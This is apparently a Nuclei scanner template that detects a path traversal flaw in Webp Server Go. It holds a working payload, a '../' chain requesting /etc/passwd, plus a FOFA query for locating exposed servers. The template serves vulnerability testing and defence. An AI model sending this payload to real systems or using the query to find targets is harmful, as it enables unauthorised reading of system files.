http:
- matchers:
  - condition: and
    dsl:
    - regex('root:.*:0:0:', body)
    - contains(server, "Webp-Server-Go")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/../../../../../../../../../../../etc/passwd'
  stop-at-first-match: true
id: webp-server-lfi
info:
  author: ritikchaddha
  description: 'Webp Server Go has an Path Traversal vulnerability. Attackers can
    use the vulnerability to access arbitraty file.

    '
  metadata:
    fofa-query: header="Webp-Server-Go"
    max-request: 1
    verified: true
  name: Webp Server Go - Path Traversal
  reference:
  - https://github.com/webp-sh/webp_server_go/issues/92
  severity: high
  tags: webp,webp-server,lfi
